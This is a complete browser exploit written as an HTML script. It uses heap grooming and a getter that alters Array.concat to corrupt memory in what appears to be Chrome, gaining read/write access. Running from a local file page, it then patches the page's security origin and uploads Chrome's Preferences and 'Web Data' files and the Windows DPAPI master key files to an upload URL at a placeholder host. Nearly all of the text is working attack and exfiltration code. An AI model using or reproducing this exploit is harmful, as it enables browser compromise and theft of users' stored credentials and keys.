<script>

window.gc = function () {
	for (i = 0; i < 50; i++) {
		zz = new ArrayBuffer(0x100000);
		zz = null;
	}
};

var dontGc	= [];

function next(freed, addressIdx, corrupt) {
	function upload(url, data) {
		var ui = new Uint8Array(data.length);
		for (var i = 0; i < data.length; i++)
			ui[i] = data.charCodeAt(i) & 0xff;

		var x = new XMLHttpRequest();
		x.open("POST", url, false);
		x.send(ui);
	}

	function download(fileName) {
		var x = new XMLHttpRequest();
		x.open("GET", fileName, false);
		x.overrideMimeType("text/plain; charset=x-user-defined");
		x.send(null);

		return x.responseText;
	}

	function listDir(dirPath) {
		var a = download(dirPath);
		var lists = a.split("addRow(").slice(2);
		for (var i = 0; i < lists.length; i++)
			lists[i] = eval("[" + lists[i].split(");")[0] + "]");

		return lists;
	}

	function walk(dirPath, prefix) {
		if (prefix == null)
			prefix = ".";

		var lists = listDir(dirPath);
		var ret = [];

		for (var i = 0; i < lists.length; i++) {
			if (lists[i][0] == "." || lists[i][0] == "..")
				continue;

			if (lists[i][2] == 0) {
				ret.push([prefix + "/" + lists[i][0], dirPath + "/" + lists[i][0]]);
				continue;
			}

			ret = ret.concat(walk(dirPath + "/" + lists[i][0], prefix + "/" + lists[i][0]));
		}

		return ret;
	}

	function patchSecurityOrigin() {
		function slowRead32(addr) {
			freed[addressIdx] = addr >> 1;
			return new Uint32Array(corrupt)[0];
		}

		function slowWrite8(addr, value) {
			freed[addressIdx] = addr >> 1;

			if (addr & 1)
				new Uint8Array(corrupt)[1] = value;
			else
				new Uint8Array(corrupt)[0] = value;
		}

		var x = new XMLHttpRequest();
		freed[addressIdx] = x;
		var tmp	= new Uint8Array(corrupt);
		var addr = (tmp[18] << 24) | (tmp[17] << 16) | (tmp[16] << 8) | tmp[15];

		addr = slowRead32(addr + 0x2c);
		addr = slowRead32(addr + 8);
		addr = slowRead32(addr - 0x4c + 8);

		slowWrite8(addr + 0x17, 1);
	}

	patchSecurityOrigin();
	var uploadUrl = "http://host/upload.php";

	upload(uploadUrl + "?fileName=Preferences", download("../AppData/Local/Google/Chrome/User Data/Default/Preferences"));
	upload(uploadUrl + "?fileName=Web Data", download("../AppData/Local/Google/Chrome/User Data/Default/Web Data"));

	var keyFiles = walk("../AppData/Roaming/Microsoft/Protect", "keys");

	for (var i = 0; i < keyFiles.length; i++)
		upload(uploadUrl + "?fileName=" + keyFiles[i][0], download(keyFiles[i][1]));
}

function fail() {
	setTimeout("document.location.reload();", 100);
}

function exploit() {
	var JUNK_SIZE = 0x400;
	var JUNK_TAG = 0x21827313;

	var arrayCreator = [];
	for (var i = 0; i < 1000; i++) {
		arrayCreator[i] = (function () {
			var a = Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {return 0x11111111;});
			var b = [];

			a[1] = 0x12345678;
			a.__defineGetter__("0", function () {
				b.length = JUNK_SIZE * 2;
				return 0x21983478;
			});

			return function () {
				return a.concat(b);
			};
		})();
	}

	var tmp = [];
	for (var i = 0; i < 100; i++)
		tmp[i] = Array.apply(null, new Array(200)).map(function () {return 1234;});

	var obj			= tmp[tmp.length/2];
	var abs 		= new Array(0x200000); for (var i = 0; i < abs.length; i++) abs[i] = null;
	var holes 		= Array.apply(null, new Array(arrayCreator.length * 2));
	var junks 		= Array.apply(null, new Array(arrayCreator.length));
	var corrupts 	= Array.apply(null, new Array(arrayCreator.length));
	var t 			= Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {return 0x22222222;});

	//Array.apply(null, new Array(0x1c * 10));

	t[0] 	= JUNK_TAG;

	for (var i = 0; i < holes.length; i++)
		holes[i] = t.concat();

	for (var i = 0; i < arrayCreator.length; i++) {
		junks[i] = t.concat();
		corrupts[i] = arrayCreator[i]();
	}

	for (var i = 0; i < junks.length; i++)
		junks[i][0x20] = obj;

	var idxs = [];

	for (var i = 400; i < 700; i++) {
		var v = corrupts[i][JUNK_SIZE];
		if (Number.isInteger(v) && v == JUNK_TAG) {
			idxs.push(i);
		}
	}

	t = null;
	junks = null;
	//holes = null;
	gc();
	
	obj = null;
	gc();


	function findFreed() {
		for (var i = 0; i < idxs.length; i++) {
			var v = corrupts[idxs[i]][JUNK_SIZE + 0x20];
			if (v != null && v.length) {
				return v;
			}
		}

		return null;
	}

	var freed = findFreed();

	if (!freed)
		return fail();

	for (var i = 0; i < abs.length; i++)
		abs[i] = new ArrayBuffer(7);

	function findCorrupt() {
		for (var i = 0; i < abs.length; i++) {
			if (abs[i].byteLength != 7) {
				return abs[i];
			}
		}

		return null;
	}

	for (var i = 1; i < freed.length; i++) {
		if (!Number.isSafeInteger(freed[i]) || freed[i] != 7)
			continue;

		freed[i] = 0x30000000;
		var ab = findCorrupt();
		if (ab)
			return next(freed, i - 1, ab);

		freed[i] = 7;
	}

	return fail();

}

function main() {
	if (document.location.origin != "file://") {
		alert("oops~!");
		return;
	}

	exploit();
}

main();

</script>